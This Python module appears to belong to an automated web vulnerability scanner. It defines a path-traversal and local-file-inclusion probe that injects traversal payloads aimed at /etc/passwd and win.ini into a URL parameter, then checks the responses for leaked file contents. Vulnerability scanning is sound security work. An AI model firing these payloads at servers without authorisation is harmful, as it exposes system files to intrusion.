"""Path traversal / local file inclusion probing.

A finding requires the response to contain a file marker that the baseline did not —
i.e. the server actually returned a file it should not have.
"""
import re
from typing import Any, Dict, List
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from tools.http_probe import fetch
from tools.registry import register_tool

PAYLOADS = (
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "../../../../../../windows/win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
)

MARKERS = (
    re.compile(r"root:[x*]?:0:0:"),
    re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.IGNORECASE),
    re.compile(r"for 16-bit app support", re.IGNORECASE),
)


def _with_param(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    query = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True) if k != param]
    query.append((param, value))
    return urlunsplit(parts._replace(query=urlencode(query), fragment=""))


def _marker(body: str) -> str:
    for pattern in MARKERS:
        match = pattern.search(body or "")
        if match:
            return match.group(0)[:60]
    return ""


@register_tool(
    name="lfi_probe",
    description="Probe one parameter for path traversal / local file inclusion by "
    "injecting traversal payloads and looking for file markers that the baseline lacks.",
    category="exploit",
        accepts="url",
        expects="findings_list",
    requires_provider=False,
)
async def lfi_probe(url: str, param: str) -> dict:
    try:
        baseline = await fetch(url)
    except ValueError as error:
        return {"url": url, "status": "error", "error": str(error)[:300]}
    except Exception as error:
        return {"url": url, "status": "error", "error": f"baseline request failed: {error}"[:300]}

    baseline_marker = _marker(baseline["body"])
    results: List[Dict[str, Any]] = []
    findings: List[Dict[str, Any]] = []

    for payload in PAYLOADS:
        try:
            probe = await fetch(_with_param(url, param, payload))
        except Exception as error:
            results.append({"payload": payload, "conclusive": False,
                            "signal": "request_failed", "detail": str(error)[:200]})
            continue
        marker = _marker(probe["body"])
        conclusive = bool(marker) and not baseline_marker
        results.append({
            "payload": payload,
            "conclusive": conclusive,
            "signal": "file_marker" if conclusive else "no_marker",
            "detail": f"命中文件特征: {marker}" if conclusive else "响应中无文件特征",
            "url": probe["request"]["url"],
            "status": probe["status"],
            "response_excerpt": probe["response_meta"]["body_excerpt"],
            "request": probe["request"],
            "response": probe["response_meta"],
        })
        if conclusive:
            findings.append({
                "title": f"Path traversal in {param}",
                "severity": "High",
                "evidence": payload,
                "parameter": param,
                "description": f"服务端返回了本不应可读的文件内容（{marker}）",
                "evidence_kind": "http_response",
            })

    return {
        "url": url,
        "status": "success",
        "parameter": param,
        "payloads_tested": len(results),
        "vulnerable": bool(findings),
        "findings": findings,
        "leads": [],
        "results": results,
        "conclusion": "confirmed" if findings else "no_signal",
    }
